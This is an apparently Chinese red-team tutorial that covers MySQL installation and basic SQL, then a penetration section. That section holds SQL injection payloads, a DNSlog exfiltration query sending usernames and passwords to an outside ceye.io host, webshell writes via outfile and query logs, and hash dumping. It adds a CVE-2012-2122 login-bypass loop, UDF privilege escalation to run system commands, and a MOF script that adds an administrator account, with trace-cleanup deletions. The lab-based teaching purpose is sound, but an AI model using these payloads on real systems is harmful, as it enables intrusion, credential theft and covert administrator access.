MySQL 是最流行的关系型数据库，与此同时也是 web 应用中最好的关系型数据库管理应用软件。我们在渗透过程中碰到的 PHP 站点大部分都会搭配
MySQL 数据库，因此它是红队攻防中最常遇到的数据库。

## 0x01 MySQL简介

MySQL 是典型的关系型数据库，所谓的关系型数据库，其实就是建立在关系模型上的数据库，借助于集合代数等数学概念和方法来处理数据库当中的数据，它的特点如下：

    
    
    1、数据以表格的形式出现
    2、每行为各种数据记录
    3、每列为记录所对应的数据域
    4、许多行和列构成了一张表单
    5、若干个表单组成数据库
    

MySQL 由瑞典的 MySQL AB 公司开发，目前属于 Oracle
公司，它作为关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据都在放一个大仓库内，这极大提升了数据库的速度和灵活性。与此同时 MySQL
支持大型数据库，可以处理上千万条记录的大型数据库。同时能够运行在多个操作系统之上，并且支持多种语言，包括 C、C++、Python 等，特别对 PHP
语言有很好的支持。

## 0x02 MySQL安装与连接

### MySQL安装配置

访问 MySQL 官网即可下载对应版本的数据库

 **下载地址：https://www.mysql.com/downloads/**

![截屏2022-06-06
16.46.29](https://image.3001.net/images/20220620/1655716898_62b03c228f1428ff05c76.png!small)

#### Windows下安装

选择 MySQL 社区版`MySQL community downloads`下载  
![2](https://image.3001.net/images/20220620/1655716902_62b03c264e7195b84fa08.png!small)

选择下载 MySQL 服务器`MySQL community server`  
![3](https://image.3001.net/images/20220620/1655716903_62b03c27a4362ff9c8f78.png!small)

选择进入旧版本下载`looking for previous GA versions?`  
![4](https://image.3001.net/images/20220620/1655716905_62b03c292b7decbe88a22.png!small)

![5](https://image.3001.net/images/20220620/1655716907_62b03c2b6a075289f3e23.png!small)

选择 Windows 64位 下载

![6](https://image.3001.net/images/20220620/1655716909_62b03c2d2f6839042dddb.png!small)

下载完成后将压缩包解压，解压至mysql目录中。但运行 mysql.exe 爆出`缺少dll文件`错误：  
![7](https://image.3001.net/images/20220620/1655716910_62b03c2e435fbf68be75d.png!small)

我们需要安装集成运行库，完成后即可执行`mysqld`，但是又出现如下下错误。根据提示在 mysql 目录下创建 data
目录用于存放数据，完成后执行成功。  
![8](https://image.3001.net/images/20220620/1655716911_62b03c2fb28cd51896d58.png!small)

但是还是打不开，在服务中未查找到 mysql 服务，于是在 mysql 目录下创建配置文件`mysql.ini`

    
    
    [mysql]
    # 设置mysql客户端默认字符集
    default-character-set=utf8
    [mysqld]
    # 设置3306端口
    port = 3306
    # 设置mysql的安装目录
    basedir=C:\www\mysql
    # 设置mysql数据库的数据的存放目录
    datadir=C:\www\mysql\data
    # 允许最大连接数
    max_connections=200
    # 服务端使用的字符集默认为8比特编码的latin1字符集
    character-set-server=utf8
    # 创建新表时将使用的默认存储引擎
    default-storage-engine=INNODB
    

以管理员身份运行cmd（否则无法创建 mysql 服务），进入 mysql 的 bin 目录中执行命令如下

    
    
    mysqld --install  #安装
    mysqld --initialize #初始化
    net start mysql #运行
    

![9](https://image.3001.net/images/20220620/1655716913_62b03c313d3b917955edb.png!small)

在版本5.6及以下无需密码即可登录，但本数据库版本为8.0，存在以下两种方式获取密码

 **方法一**

    
    
    1、在 mysql.ini 文件末尾加上skip-grant-tables（取消权限设置）保存文件。
    2、重启mysql服务
    3、cmd下进入 mysql/bin 目录，输入 mysql -u root -p ，回车，这时候不需要密码即可登录
    重置密码。输入 use mysql 回车 
    4、输入如下命令修改密码，需要注意的是新版本下 mysql 数据库 password 字段更改为authentication_string
    
    update user set authentication_string=password("newPassword") where user="root"; 
    
    5、删除 mysql.ini 文件末尾 skip-grant-tables 并保存文件
    6、重启 mysql 服务后就能用新密码登录 root 账户
    

**方法二**

在目录`data/*.err`文件中可显示直接密码  
![10](https://image.3001.net/images/20220620/1655716914_62b03c32ccb3f6ea2d6dd.png!small)  
使用该密码能够直接登录数据库

    
    
    mysql.exe -u root -p
    

![11](https://image.3001.net/images/20220620/1655716917_62b03c356d465f7f4d6fc.png!small)

登录成功后必须重设密码，否则会一直提示下面这行错误。

    
    
    You must reset your password using ALTER USER statement before executing this statement.
    

重新设置密码后即可完成配置

    
    
    ALTER USER "root"@"localhost" IDENTIFIED BY "新密码";
    

![12](https://image.3001.net/images/20220620/1655716918_62b03c36e1639f025e1ff.png!small)

#### Linux下安装

在 Linux 安装 MySQL 相比 Windows
要简单方便许多，通常使用`apt`、`yum`等包管理软件就可以安装成功，下面以`yum`为例进行演示

    
    
    wget http://repo.mysql.com/mysql-community-release-el7-5.noarch.rpm
    rpm mysql-community-release-el7-5.noarch.rpm
    yum update
    yum install mysql-server
    

有了 RPM 包后我们就可以下载获取对应的 MySQL 软件程序

  * MySQL - MySQL服务器。你需要该选项，除非你只想连接运行在另一台机器上的MySQL服务器。

  * MySQL-client - MySQL 客户端程序，用于连接并操作Mysql服务器。

  * MySQL-devel - 库和包含文件，如果你想要编译其它MySQL客户端，例如Perl模块，则需要安装该RPM包。

  * MySQL-shared - 该软件包包含某些语言和应用程序需要动态装载的共享库(libmysqlclient.so*)，使用MySQL。

  * MySQL-bench - MySQL数据库服务器的基准和性能测试工具。

设置权限并启动 MySQL

    
    
    chown -R mysql:mysql /var/lib/mysql/
    mysqld --initialize
    systemctl start mysqld
    

有时候我们还会用到`MariaDB`，其实这时 MySQL 的一个分支，与 MySQL 完全兼容，安装命令如下：

    
    
    yum install mariadb-server mariadb
    systemctl start mariadb
    

### MySQL连接

#### Windows下连接

自动安装的话通过 phpstudy 直接安装开启服务即可，默认配置内容如下：

    
    
    username : root（最高权限用户）
    password : root
    port : 3306
    host : localhost
    

本地的话进入 MySQL 的 bin 目录通过`mysql.exe`就可以直接登录数据库

    
    
    mysql.exe -uroot -proot -hlocalhost -P3306
    

远程连接则需要在数据库中开启用户外联才能完成，比如设置root用户外联

    
    
    grant all on *.* to root@'%' identified by 'root' with grant option;
    

![截屏2021-09-21
下午5.31.21](https://image.3001.net/images/20220620/1655716920_62b03c384ee9f5e75fa73.png!small)

#### Linux下连接

在 Linux 中连接数据库也会方便不少，因为我们不需要进行环境变量的配置或进入 MySQL 的 bin 目录下操作

    
    
    mysql -uroot -proot -hlocalhost -P3306
    

如果需要退出数据库的话，可使用如下命令完成退出

    
    
    quit
    exit 
    \q
    

## 0x03 MySQL基础用法

### 命令注释

通过以下三类注释符可对执行命令进行注释

    
    
    #mac
    --mac
    /*mac*/
    

### 基础操作

查询当前数据库的基本信息

    
    
    select database(); ## 查看当前数据库
    select user(); ##查看当前用户
    show status; ##查看当前特定资源信息
    select version(); ##查看当前数据库版本
    

对数据库进行增删改查

    
    
    show databses; ##查看所有数据库
    select database(); ##查看当前数据库
    use mysql; ##使用mysql数据库
    create database test1; ##添加test1数据库
    drop database test1; ##删除数据库
    alter database test1 charset utf8; ##修改数据库编码方式
    

对数据表进行增删改查

    
    
    show tables; ##查看当前数据库下所有表名
    desc users; ##查看数据表内容，包含表结构、字段类型、主键、是否为空等属性
    select username,password from users; ##查看当前users表中账号密码
    create table users(id int(7)); ##创建 users 表
    create table users(id int(7) auto_increment,username varchar(100) not null,password char(100) not null,primary key(id))engine=innodb default charset=utf8; ##创建完整表
    drop table users; ##删除表
    alter table users rename users1; ##修改表
    alter table users modify username varchar(155); ##修改字段数据类型
    alter table users change username uname char(111); ##修改字段名
    alter table users add desc char(111) not null; ##增加字段名
    alter table users drop desc; ##删除字段名
    alter table users engine=myisam; ##修改存储表引擎
    

**数据类型介绍参考：https://www.cnblogs.com/-xlp/p/8617760.html**

常见的约束条件

    
    
    primary key ##标识该属性为该表的主键，可以唯一的标识对应的元组
    foreign key ##标识该属性为该表的外键，是与之联系某表的主键
    not null    ##标识该属性不能为空
    unique      ##标识该属性是唯一的
    auto_increment ##标识该属性的值自动增加
    default     ##标识该属性为默认值
    

对数据进行增删改查

    
    
    insert into users(id,username,password) values(1,'mac','mac'); ##为所有字段添加数据
    insert into users(username) values('mac1'); ##为指定字段添加数据，id自动增加
    insert into users(id,username,password) values(null,'mac2','123456'),(null,'mac2','123456'); ##指定字段增加多条数据
    insert into users values(null,'mac3','123456'),(null,'mac4','123456'); ##增加多条数据
    delete from users where id=1; ##删除数据，如果删除前id为7，那么之后id增加为8、9、10...
    truncate table users; ##删除数据，会清除全部，如果删除前id为7，那么之后id增加为1
    delete from users; ##全部删除表
    update users set password="111111" where id = 1; ##修改指定类型数据
    update users set password="111111",username="mac2" where id = 2; ##修改多种类型数据
    update users set password="333333"; ##修改所有类型数据
    select * from users; ##查询users表中所有数据
    select username from users; ##查询单个字段数据
    select username,password from users; ##查询多个字段数据
    select * from users where id=1; ##按条件查询
    

常见关系运算符

    
    
    = 等于
    != <> 不等于
    < 小于 
    > 大于 
    <= 小于等于 
    >= 大于等于
    

### 高级查询

带in关键字查询

    
    
    select * from users where id in(1,2,3);
    select * from users where id not in(1,2,3);
    

空值查询

    
    
    select * from users where id is not null;
    select * from users where id is null;
    

去重复查询

    
    
    select distinct username from users;
    

like模糊查询

    
    
    ##%代表任意值
    select * from users where username like "d%";
    select * from users where username like "%d%";
    ##_代表单个任意值
    select * from users where username like "d_";
    select * from users where username like "_d_";
    

and 和 or 多条件查询

    
    
    select * from users where id < 7 and username = 'mac3';
    select * from users where id = 5 or username = 'mac4';
    ##and和or一起使用
    select * from users where id > 2 and password = '123456' or username = 'mac1';
    select * from users where id > 2 or username = 'mac2' and password = '123456';
    当and和or一起使用时，and的优先级高于or，因此两者一起使用时会优先运算and，再运算or
    

聚合查询

    
    
    select count(id) from users;
    select sum(id) from users;
    select avg(id) from users;
    select max(id) from users;
    select min(id) from users;
    
    select count(*) from users;
    
    count() 返回某列的行数
    sum()   返回某列值的和
    avg()   返回某列的平均值
    max()   返回某列的最大值
    min()   返回某列的最小值
    

分组查询

    
    
    ##单独使用group by
    select * from users group by username;
    
    ##group by 和 having一起使用
    select max(id) from users group by username;
    select count(id) from users group by username;
    select * from users group by username having sum(id)<6;
    

> having关键字和where作用相同，区别在于having关键字可以跟聚合函数，而where关键字不能跟聚合函数。通常having关键字与group
> by一起使用，对分组结果进行过滤

使用 limit 限制查询结果的数量

    
    
    select * from users limit 1;
    select * from users limit 5;
    #显示1-5结果
    select * from users limit 1,5;
    

为表和字段取别名

    
    
    ##为表取别名
    select * from users as u where u.id = 2;
    ##为字段取别名
    select username as name from users;
    

where子查询

    
    
    select * from users where id in (select * from users where id > 5);
    ## 把内层查询结果当作外层查询的比较条件
    select * from users where id in (select id from users where id > 5);
    

from子查询

    
    
    select * from (select * from users where id < 4) as re;
    ## 将内层查询结果提供给外层再次查询
    

exists子查询

    
    
    select * from users where exists(select * from users where id > 2);
    ## 将外层查询结果拿到内层，看内层查询是否成立，加入括号内成立，则输出所有，返回不成立则无
    

联合查询

    
    
    select * from users union select *,1 from users1;
    

### 连接查询

 **内连接关键词：inner join on**

组合两个表中的记录，法牛话关联字段相符的记录，返回两个表的交集

    
    
    select * from a_new a inner join b_new b on a.id = b.id;
    

**左连接操作关键词：left join on/ left outer join on**

左连接就是左外连接，左表的记录将全部表示出来，右表只会显示符合搜索条件的记录，而右表记录不足的地方均为 null

    
    
    select * from a_new a left join b_new b on a.id = b.id;
    

**右连接操作关键词：right join on/ right outer join on**

右连接就是右外连接，左表只会显示符合搜索条件的记录，右表的记录将会全部表示出来，而左表记录不足的地方均为 null

    
    
    select * from a_new right join b_new b on a.id = b.id;
    

## 0x04 MySQL渗透

### SQL注入

#### 数据库信息获取

information_schema 数据库是 MySQL
自带的，它提供了访问数据库元数据的方式，什么是元数据呢？元数据就是关于数据的数据，如数据库名、表名、列的数据类型、访问权限等。有时候用于表述该信息的其他术语包括“数据词典”和“系统目录”

在 MySQL 中 information_schema
看作是一个数据库，确切的说是信息数据库。其中保存着关于mysql服务器维护的所有其他数据库的信息。如数据库名、数据库表、表栏的数据类型和访问权限等。而在
information_schema 中有数个只读表，实际上就是视图，而不是基本表，因此无法看到与之相关的任何文件

>   * schemata表：提供了当前数据库实例中所有数据库的信息。show database()的结果就是取自该表
>
>   * tables表：提供了关于数据库表的信息，描述了哪个表属于哪个库、表类型、表引擎、创建时间等信息，show tables from
> schemaname的结果就是取自该表
>
>   * columns表：提供了关于表中列的信息，描述了某张表上所有列信息，show columns from
> schemaname.tablename的结果就是取自该表
>
>   * statistics表：提供了关于表索引的信息，show index from schemaname.tablename的结果就是取自该表
>
>   * users_privileges表：提供了关于全程权限的信息，该信息取自mysql.user授权表，是非标准表
>
>   * schema_privileges表：提供了关于数据库权限的信息，该信息取自mysql.user授权表，是非标准表
>
>   * table_privileges表：提供了关于表权限的信息，该信息取自mysql.tables_priv授权表，是非标准表
>
>   * column_privileges表：提供了关于列权限的信息，该信息取自mysql.columns_priv授权表，是非标准表
>
>   * character_sets表：提供了mysql实例可用字符集的信息。show character set结果取自该表
>
>   * collations表：提供了关于各字符集的对照信息
>
>   * collation_sharacter_set_applicability表：指明了可用于校对的字符集，这些列等效于show
> collation的前两个显示字段
>
>   * table_constraints表：指明了存在约束的表以及表的约束类型
>
>   * key_column_usage表：指明了具有约束的键列
>
>   * routines表：指明了关于存储子程序（存储程序和函数）的信息。此时routines表不包含自定义函数（UDF），而名为mysql.proc
> name的列指明了information_schema.routines表的mysql.proc表列
>
>   * view表：指明了关于数据库中的视图信息，需要拥有show view权限，否则无法看到视图信息
>
>   * triggers表：指明了关于触发程序的信息，必须拥有super权限才能查看该表
>
>

利用 information_schema 中的表查询相关数据

    
    
    schemata        包含所有数据库名、类型、字符集等
    tables          包含所有表信息
    columns         包含所有列信息
    

查询`schemata`中的第一个库名

    
    
    select schema_name from information_schema.schemata limit 0,1;
    

![截屏2021-09-24
上午1.21.12](https://image.3001.net/images/20220620/1655716921_62b03c399c0fad11102ad.png!small)

查询`information_schema`中的数据信息

    
    
    select * from information_schema.tables where table_schema='information_schema' limit 0,1;
    

![截屏2021-09-24
上午1.23.22](https://image.3001.net/images/20220620/1655716922_62b03c3ac231e93d836e7.png!small)

通过十六进制转换后查询

    
    
    select hex('information_schema');
    # 696E666F726D6174696F6E5F736368656D61
    select * from information_schema.tables where table_schema=0x696E666F726D6174696F6E5F736368656D61 limit 0,1;
    

![截屏2021-09-24
上午1.25.56](https://image.3001.net/images/20220620/1655716923_62b03c3be544b00fc7ab6.png!small)

查询表名

    
    
    select column_name from information_schema.columns where table_schema=0x696E666F726D6174696F6E5F736368656D61 and table_name = 'character_sets';
    

![截屏2021-09-24
上午1.29.15](https://image.3001.net/images/20220620/1655716924_62b03c3cf2e11e597d2c9.png!small)

通过查询到的表名、列名查询数据信息

    
    
    select id,username,password from test.users;
    

![截屏2021-09-24
上午1.33.44](https://image.3001.net/images/20220620/1655716926_62b03c3e4d03958085807.png!small)

有了以上基础，我们就以 sqlilabs 为例开始测试 SQL 注入，注入方式为基础的联合查询注入  
![截屏2021-12-04
下午10.28.07](https://image.3001.net/images/20220620/1655716927_62b03c3f630d85700ecfd.png!small)

目标SQL语句如下：

    
    
    $sql = select * from users where id='$id' limit 0,1
    # 返回内容
    if true:
        输出查询内容
    else:
        print_r(mysql_error());
    

判断注入点

    
    
    id=1' AND '1'='1 //返回正常界面
    

![截屏2021-12-04
下午10.34.02](https://image.3001.net/images/20220620/1655716928_62b03c40670874004b965.png!small)

    
    
    id=1' AND '1'='2 //返回错误界面
    

![截屏2021-12-04
下午10.34.33](https://image.3001.net/images/20220620/1655716929_62b03c4183a698d9fd299.png!small)

判断字段数

    
    
    id=1' order by 3--+ //返回正常界面
    

![截屏2021-12-04
下午10.38.19](https://image.3001.net/images/20220620/1655716930_62b03c428707306d3d564.png!small)

    
    
    id=1' order by 4--+ //返回错误界面
    

![截屏2021-12-04
下午10.38.07](https://image.3001.net/images/20220620/1655716931_62b03c43a00f9c2d9e060.png!small)

由此可说明字段数为3，通过 union select 查看回显位置

    
    
    id=-1' union select 1,2,3--+
    

![截屏2021-12-04
下午10.40.33](https://image.3001.net/images/20220620/1655716932_62b03c448d54cf0e909ea.png!small)

查询基础信息

    
    
    id=-1' union select 1,version(),user()--+
    id=-1' union select 1,@@version_compile_os()，database()--+
    

![截屏2021-12-04
下午10.43.32](https://image.3001.net/images/20220620/1655716933_62b03c45a81f7551be40b.png!small)

![截屏2021-12-04
下午10.45.23](https://image.3001.net/images/20220620/1655716934_62b03c46d48fb52431500.png!small)

查询表名

    
    
    id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security'--+
    

![截屏2021-12-04
下午10.49.07](https://image.3001.net/images/20220620/1655716936_62b03c481455f6b46c359.png!small)

查询列名

    
    
    id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'--+
    

![截屏2021-12-04
下午10.50.32](https://image.3001.net/images/20220620/1655716937_62b03c494990b14112b57.png!small)

查询关键信息

    
    
    id=-1' union select 1,group_concat(username),group_concat(password) from users--+
    

![截屏2021-12-04
下午10.53.34](https://image.3001.net/images/20220620/1655716938_62b03c4aa7af7d410320c.png!small)

#### 哈希获取与解密

使用SQL语句查询到用户哈希命令如下

    
    
    select host,user,password from mysql.user; //MySQL<=5.6
    select host,user,authentication_string from mysql.user; //MySQL>=5.7
    

通过 sqlmap 能够直接获取用户哈希

    
    
    sqlmap -u xxx --passwords
    

![截屏2022-06-16
11.27.35](https://image.3001.net/images/20220620/1655716940_62b03c4c03a04e19dd665.png!small)

如果遇到哈希值无法破解的情况，通过md5解密网站也可拿到明文密码  
![截屏2022-06-16
11.27.25](https://image.3001.net/images/20220620/1655716941_62b03c4da0cf18330e95d.png!small)

#### 文件读取与写入

文件读取和写入需要满足以下几个前提条件

    
    
    1、拥有高权限数据库用户，比如root
    2、secure_file_priv无限制
    3、当前用户对目标目录拥有读取/写入权限
    4、知道读取/写入的绝对路径
    

通过`load_file()`函数读取文件命令如下

    
    
    select load_file('/var/www/html/index.php') //Linux
    select load_file('C:\\phpStudy\\WWW\\shell.php') //Windows
    

成功读取目标文件内容

    
    
    ?id=-1' union select 1,2,load_file('C:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.php')--+
    

![截屏2022-06-16
14.49.56](https://image.3001.net/images/20220620/1655716943_62b03c4f371aec4b04591.png!small)

与此同时`load_file()`还能够通过 dnslog 的方式读取文件内容，但是在 Linux 下无法使用 dnslog 进行攻击，这是因为
Windows 有 UNC 路径，而 Linux 没有。那什么是 UNC 路径呢？UNC 路径是通过命名规定用于远程共享文件的一种格式，具体格式如下：

    
    
    \\servername\sharename\filname
    

例如`\\192.168.0.132\mac\`是一个的典型的 UNC 路径，MySQL
中的`concat`函数会拼接这其中的反斜杠符`\`，通过转移反斜杠符`\`变成了两个反斜杠符`\\`，利用 UNC 路径可完成 dnslog 外带数据攻击

    
    
    id=1';select load_file(concat('\\\\',(select hex(concat_ws(0x7e,username,password)) from users limit 0,1),'.qk9fw5.ceye.io\\mac'))--+
    

![截屏2022-05-12
17.34.13](https://image.3001.net/images/20220620/1655716945_62b03c515f96aa79b2055.png!small)

在 dnslog 平台上返回查询结果，使用 hex 编码可有效减少特殊符号的干扰  
![截屏2022-05-12
17.34.02](https://image.3001.net/images/20220620/1655716948_62b03c547acf0564d693f.png!small)

解码 hex 编码还原数据

    
    
    echo 44756D627E44756D62 | python3 -c "import sys, binascii; sys.stdout.buffer.write(binascii.unhexlify(input().strip()))"
    

![截屏2022-05-12
17.37.44](https://image.3001.net/images/20220620/1655716949_62b03c55637f78f180998.png!small)

通过 into outfile 以及 into dumpfile 则能够直接写入文件

    
    
    ?id=-1' union select 1,2,'<?php phpinfo();?>' into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\test.php'--+
    ?id=-1' union select 1,2,0x3c3f70687020706870696e666f28293b3f3e into outfile 'C:\\phpStudy\\PHPTutorial\\WWW\\test.php'--+
    

![截屏2022-06-16
15.20.19](https://image.3001.net/images/20220620/1655716950_62b03c564d4f242433a7a.png!small)

直接访问木马如下，说明写入成功  
![截屏2022-06-16
15.20.35](https://image.3001.net/images/20220620/1655716951_62b03c57e806463b56d75.png!small)

通过以下命令可查询 MySQL 特性`secure_file_priv`是否开启

    
    
    show global variables like '%secure_file_priv%';
    

Value| 说明  
---|---  
NULL| 不允许导入或导出  
/tmp| 只允许在 /tmp 目录导入导出  
空| 不限制目录  
  
>   * 在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件
>
>   * 在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件
>
>

#### 日志查询写入shell

那么当`secure_file_priv`不为空时，还有什么可以方式能够获取权限呢？答案是通过日志写入，主要分为常规日志写入和慢查询日志写入。其中利用条件如下：

    
    
    1、拥有高权限数据库用户，比如root
    2、当前用户对目标目录拥有写入权限
    3、知道读取/写入的绝对路径
    

首先查询当前常规日志的相关配置

    
    
    SHOW VARIABLES LIKE 'general%';
    

![截屏2022-05-12
18.17.31](https://image.3001.net/images/20220620/1655716953_62b03c595d667ef2b0f25.png!small)

还是以 sqlilabs 为例进行测试，通过堆叠注入开启日志并设置日志存储路径

    
    
    id=1';set global general_log="on";set global general_log_file='C:\\phpStudy\\PHPTutorial\\WWW\\mac.php';--+
    

![截屏2022-05-13
09.18.03](https://image.3001.net/images/20220620/1655716954_62b03c5a6b66303e285bc.png!small)

再次查看日志，发现日志配置已修改完成

    
    
    SHOW VARIABLES LIKE 'general%';
    

![截屏2022-05-13
09.18.18](https://image.3001.net/images/20220620/1655716957_62b03c5d46a9e963511ac.png!small)

尝试写入 webshell

    
    
    id=1';select <?php phpinfo();?>
    

![截屏2022-05-13
09.29.29](https://image.3001.net/images/20220620/1655716958_62b03c5e436af0c9167d0.png!small)

访问木马地址`mac.php`成功解析，说明写入成功  
![截屏2022-05-13
09.29.50](https://image.3001.net/images/20220620/1655716960_62b03c60ce5ac9ea5ffa7.png!small)

除了常规的日志写入以外，我们还能够以慢日志写入的方式完成写入，而方法上也基本大同小异。唯一的不同的点就在于慢查询日志主要记录在 MySQL
中响应时间超过阀值的语句，因此在注入时需要借助`sleep()`函数延长查询时间，否则无法记录到慢查询日志当中。在数据库中查询慢查询日志记录是否开启

    
    
    show variables like '%slow_query_log%';
    

![截屏2022-06-16
21.14.02](https://image.3001.net/images/20220620/1655716962_62b03c62b4d5af6f4c0ff.png!small)

开启慢查询日志记录

    
    
    set global slow_query_log = "ON";
    

设置慢查询日志文件

    
    
    set global slow_query_log_file='/var/www/html/shell.php'
    

通过 SQL 注入开启慢查询日志写入木马

    
    
    id=1';set global slow_query_log = "ON";set global slow_query_log_file='C:\\phpStudy\\PHPTutorial\\WWW\\mac2.php';--+
    

![截屏2022-06-16
22.15.15](https://image.3001.net/images/20220620/1655716963_62b03c63be4a1ea76790f.png!small)  
再次查看日志，发现慢日志配置已修改完成

    
    
    show variables like '%slow_query_log%';
    

![截屏2022-06-16
22.18.38](https://image.3001.net/images/20220620/1655716966_62b03c6677951a2882384.png!small)

向慢查询日志中写入 webshell

    
    
    id=1';select '<?php phpinfo();?>' from mysql.db where sleep(10)--+
    

![截屏2022-06-16
22.21.33](https://image.3001.net/images/20220620/1655716967_62b03c6771b7080045e66.png!small)

访问木马地址`mac2.php`成功解析，说明写入成功  
![截屏2022-06-16
22.21.42](https://image.3001.net/images/20220620/1655716970_62b03c6a5d51c128ba96c.png!small)

### yaSSL缓冲区溢出

MySQL 的 yaSSL 库存在一个缓冲区溢出漏洞，允许远程攻击者利用漏洞执行任意代码。该漏洞由于年代比较久远，因此也没有详细研究。目前已经在 MSF
中完成集成，利用模块如下：

    
    
    exploit/windows/mysql/mysql_yassl_hello
    exploit/linux/mysql/mysql_yassl_hello
    

在测试过程中发现 MySQL 版本小于以下影响版本可重点关注

    
    
    MySQL AB MySQL 5.1.x
    MySQL AB MySQL 5.5.x
    

### 身份认证绕过

#### 漏洞详情

身份认证绕过（CVE-2012-2122）漏洞即用户名多次输入错误密码会有几率直接成功登录数据库。与 yaSSL
缓冲区溢出一样，由于不太常见的原因，我也没对该漏洞进行复现

#### 影响版本

    
    
    MySQL 5.1.62, 5.2.12, 5.3.6, 5.5.23
    

#### 漏洞利用

在 Linux 中通过 shell 命令循环 1000 次登陆数据库

    
    
    for i in `seq 1 1000`; do mysql -uroot -pwrong -h 127.0.0.1 -P3306 ; done
    

在 MSF 中也同样集成了相关利用模块

    
    
    msf > use auxiliary/scanner/mysql/mysql_authbypass_hashdump
    msf > set rhosts 127.0.0.1
    msf > run
    

### UDF提权

#### 漏洞详情

udf 为 MySQL 中的用户自定义函数，将动态链接库文件写入 MySQL 的 plugin
目录中可创建自定义函数，从而能够帮助我们执行系统命令，完成数据库权限至系统权限的提升。

其中不同系统的动态链接库文件在 Sqlmap 以及 Metasploit 中已内置，Sqlmap 的 UDF
动态链接库文件位置为`/data/udf/mysql`  
![截屏2022-06-16
22.55.16](https://image.3001.net/images/20220620/1655716972_62b03c6c0d0a3d173d35b.png!small)  
但是这些动态链接库为了防止被误杀都进行了编码处理，因此无法直接使用。需要借助 Sqlmap 自带的 cloak.py 进行解码后才能使用

    
    
    python3 cloak.py -d -i lib_mysqludf_sys.so_ -o lib_mysqludf_sys.so
    

Metasploit 的 UDF
动态链接库文件则无需解码，同时它的位置位于`/embedded/framework/data/exploits/mysql`  
![截屏2022-06-16
23.00.17](https://image.3001.net/images/20220620/1655716972_62b03c6ccc09e8f70a519.png!small)

#### 漏洞利用

根据漏洞利用原理，我们首先需要寻找 MySQL 的插件目录，通过 SQL 语句可以非常方便地找到

    
    
    show variables like '%plugin%';
    

![截屏2022-06-16
23.11.15](https://image.3001.net/images/20220620/1655716973_62b03c6da18bdbccf9425.png!small)  
如果不存在的话可以在 shell 找到 MySQL 的安装目录，并在其中创建`/lib/plugin`文件夹，但是通过 NTFS
数据流创建文件夹的成功率相对比较低。

    
    
    select 123 into dumpfile 'C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation';
    

什么？你说找不到 MySQL 的安装目录，通过 SQL 语句也能够查询出来

    
    
    select @@basedir;
    

![截屏2022-06-16
23.15.32](https://image.3001.net/images/20220620/1655716974_62b03c6e5b617b5f88de2.png!small)

当然写入 plugin 目录需满足以下条件

    
    
    1、拥有高权限数据库用户，比如root
    2、secure_file_priv无限制
    3、当前用户对 plugin 目录拥有写入权限
    

执行 SQL 语句可将动态链接库文件写入 plugin 目录中，其中的 hex
编码是将动态链接库文件经过十六进制编码后的结果，如果懒得转换可以参考国光大神的[UDF](https://www.sqlsec.com/tools/udf.html)

    
    
    SELECT 0x7f454c4602... INTO DUMPFILE 'C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll';
    

![截屏2022-06-16
23.37.15](https://image.3001.net/images/20220620/1655716975_62b03c6f2f459e3b0c217.png!small)

利用写入的动态链接库创建自定义函数。但是出现了报错信息。

    
    
    CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
    

![截屏2022-06-17
00.21.09](https://image.3001.net/images/20220620/1655716976_62b03c703b1480bc843b0.png!small)

这是因为 MySQL 的安装版本为 32 位，而写入的动态链接库为 64 位，因此我们需要重新写入 32 位的动态链接库，成功创建后看 MySQL
函数中是否已经新增

    
    
    select * from mysql.func;
    

![截屏2022-06-17
00.47.34](https://image.3001.net/images/20220620/1655716976_62b03c70dc75abaa97939.png!small)

如果创建成功我们就可以利用该函数执行系统命令

    
    
    select sys_eval('whoami');
    

![截屏2022-06-17
00.48.58](https://image.3001.net/images/20220620/1655716977_62b03c7192149bbece102.png!small)

可以看到当前权限为管理员，如果需要删除自定义函数，可执行如下命令

    
    
    drop function sys_eval;
    

如果当前已经拥有 webshell，我们可以上传相关脚本完成 UDF 提权  
![3](https://image.3001.net/images/20220620/1655716978_62b03c72a3d4e3b8c361e.png!small)

导出 UDF 后可通过脚本执行系统命令  
![9](https://image.3001.net/images/20220620/1655716980_62b03c7436c077fd4bb66.png!small)

### MOF提权

#### 漏洞详情

利用 MOF 进行提权局限性比较大，基本上只能在 Windows Server 2003
环境中才能成功提权。利用原理是在`C:/windows/system32/wbem/mof`下的 mof
文件每隔一段时间都会被系统执行，因为mof文件中有一部分是 VBS 脚本，利用这个VBS脚本可调用 cmd 执行系统命令。

#### 漏洞利用

利用的 mof 脚本内容如下：

    
    
    #pragma namespace("\\\\.\\root\\subscription") 
    
    instance of __EventFilter as $EventFilter 
    { 
        EventNamespace = "Root\\Cimv2"; 
        Name  = "filtP2"; 
        Query = "Select * From __InstanceModificationEvent " 
                "Where TargetInstance Isa \"Win32_LocalTime\" " 
                "And TargetInstance.Second = 5"; 
        QueryLanguage = "WQL"; 
    }; 
    
    instance of ActiveScriptEventConsumer as $Consumer 
    { 
        Name = "consPCSV2"; 
        ScriptingEngine = "JScript"; 
        ScriptText = 
    "var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user mac P@ssw0rd /add\")\nWSH.run(\"net.exe localgroup administrators mac /add\")"; 
    };  //执行语句
    
    instance of __FilterToConsumerBinding 
    { 
        Consumer   = $Consumer; 
        Filter = $EventFilter; 
    };
    

通过 SQL 语句可将该文件导入目标目录`C:/windows/system32/wbem/mof`当中

    
    
    select 0x237... into dumpfile 'C:\\windows\\system32\\webm\\mof\\mac.mof'
    

执行成功后我们可通过 cmd 查看用户是否已经添加，如添加则提权成功

    
    
    net user mac
    

由于每隔一段时间 mof 文件都会被执行，因此想要完成痕迹清理需要暂时关闭 winmgmt 服务，最后删除 mof 文件

    
    
    net stop winmgmt
    rmdir /s /q C:\Windows\system32\wbem\Repository\
    del C:\Windows\system32\wbem\mof\good\mac.mof /F /S
    

在拥有 webshell 的情况下，我们可以上传相关脚本完成 MOF 提权  
![3](https://image.3001.net/images/20220620/1655716981_62b03c75198f7aa9fab53.png!small)

连接数据库后点击 exploit 可成功写入将 mof 文件  
